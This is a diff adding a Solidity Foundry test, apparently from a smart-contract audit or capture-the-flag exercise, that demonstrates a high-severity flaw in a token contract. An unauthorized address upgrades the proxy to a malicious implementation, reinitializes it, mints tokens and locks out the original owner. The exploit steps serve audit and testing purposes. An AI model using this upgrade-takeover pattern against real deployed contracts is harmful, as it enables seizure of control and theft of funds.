@@ -229,5 +229,51 @@ contract HalbornToken_Test is Test {
         );
     }
 
+    // High: Reinitialization After Upgrade Enables State Reset
+    /**
+     * @dev Reinitialization attack after upgrade
+     *
+     * After upgrading to a malicious implementation, the attacker can call
+     * initialize() again on the new implementation, resetting all state
+     * including ownership.
+     *
+     * Attack flow:
+     * 1. Upgrade to malicious implementation
+     * 2. Call initialize() on new implementation (reinitialization)
+     * 3. Attacker becomes owner, all state is reset
+     */
+    function test_reinitializationAfterUpgradeEnablesStateReset() public {
+        address unauthorizedUser = address(0xdead);
+        
+        // Verify original owner and loans address
+        assertEq(token.owner(), hexWraith);
+        assertEq(token.halbornLoans(), address(1)); // Set in setUp
+        
+        vm.startPrank(unauthorizedUser);
+
+        // Step 1: Upgrade to malicious implementation WITHOUT initializing
+        Token_UUPSattack attack = new Token_UUPSattack();
+        token.upgradeTo(address(attack));
+
+        // Step 2: Now initialize on new implementation (this should work because it's a new implementation)
+        // The initializer modifier allows calling initialize() on a new implementation
+        token.initialize();
+
+        // Step 3: Verify attacker can control the contract
+        // The attack contract sets hackerAddress = msg.sender in initialize()
+        // Now attacker can call setLoans which requires onlyHacker
+        token.setLoans(address(0x123));
+        assertEq(token.halbornLoans(), address(0x123));
+
+        // Verify attacker can mint tokens (demonstrating control)
+        token.mintToken(address(this), 1000);
+        assertEq(token.balanceOf(address(this)), 1000);
+
+        // Original owner lost control
+        vm.startPrank(hexWraith);
+        vm.expectRevert(); // Original owner can no longer control contract
+        token.setLoans(address(0x10));
+    }
+
     receive() external payable {}
 }
